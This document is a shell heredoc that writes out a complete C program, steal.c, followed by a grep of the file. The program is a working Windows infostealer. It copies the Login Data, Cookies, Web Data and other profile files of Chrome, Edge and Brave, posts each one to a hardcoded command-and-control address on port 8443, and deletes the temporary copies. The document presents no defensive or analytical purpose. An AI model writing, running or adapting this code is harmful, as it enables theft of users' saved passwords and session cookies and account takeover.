cat > steal.c << 'CEOF'
#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>
#include <shlobj.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

#define C2_HOST "192.168.100.62"
#define C2_PORT 8443

int copy_locked(const char* src, const char* dst) {
    return CopyFileA(src, dst, FALSE);
}

int exfil(const char* filename, const char* data, size_t len) {
    WSADATA wsa;
    if (WSAStartup(MAKEWORD(2,2), &wsa) != 0) return 0;
    SOCKET s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (s == INVALID_SOCKET) { WSACleanup(); return 0; }
    struct sockaddr_in addr = {0};
    addr.sin_family = AF_INET;
    addr.sin_port = htons(C2_PORT);
    inet_pton(AF_INET, C2_HOST, &addr.sin_addr);
    if (connect(s, (struct sockaddr*)&addr, sizeof(addr)) == SOCKET_ERROR) {
        closesocket(s); WSACleanup(); return 0;
    }
    char header[1024];
    snprintf(header, sizeof(header),
        "POST /upload HTTP/1.1\r\nHost: %s\r\nContent-Length: %zu\r\nX-File: %s\r\nConnection: close\r\n\r\n",
        C2_HOST, len, filename);
    send(s, header, (int)strlen(header), 0);
    send(s, data, (int)len, 0);
    closesocket(s);
    WSACleanup();
    return 1;
}

void grab_and_send(const char* path, const char* label) {
    FILE* f = fopen(path, "rb");
    if (!f) return;
    fseek(f, 0, SEEK_END);
    long sz = ftell(f);
    fseek(f, 0, SEEK_SET);
    if (sz <= 0 || sz > 50 * 1024 * 1024) { fclose(f); return; }
    char* buf = malloc(sz);
    if (!buf) { fclose(f); return; }
    fread(buf, 1, sz, f);
    fclose(f);
    exfil(label, buf, sz);
    free(buf);
}

void grab_delete(const char* path, const char* label) {
    grab_and_send(path, label);
    DeleteFileA(path);
}

void chrome_family(const char* base, const char* label) {
    const char* files[] = {
        "\\Login Data", "\\Cookies", "\\Web Data", "\\History",
        "\\Local State", "\\Preferences"
    };
    for (int i = 0; i < 6; i++) {
        char src[MAX_PATH], tmp[MAX_PATH];
        snprintf(src, sizeof(src), "%s%s", base, files[i]);
        snprintf(tmp, sizeof(tmp), "%s\\%s_%d.tmp", getenv("TEMP"), label, i);
        if (copy_locked(src, tmp)) {
            grab_delete(tmp, files[i] + 1);
        }
    }
}

int main(void) {
    char local[MAX_PATH] = {0};

    if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, local))) {
        char chrome[MAX_PATH];
        snprintf(chrome, sizeof(chrome), "%s\\Google\\Chrome\\User Data\\Default", local);
        chrome_family(chrome, "chrome");

        char edge[MAX_PATH];
        snprintf(edge, sizeof(edge), "%s\\Microsoft\\Edge\\User Data\\Default", local);
        chrome_family(edge, "edge");

        char brave[MAX_PATH];
        snprintf(brave, sizeof(brave), "%s\\BraveSoftware\\Brave-Browser\\User Data\\Default", local);
        chrome_family(brave, "brave");
    }

    return 0;
}
CEOF

grep -n 'WinMain\|int main\|chrome_family' steal.c
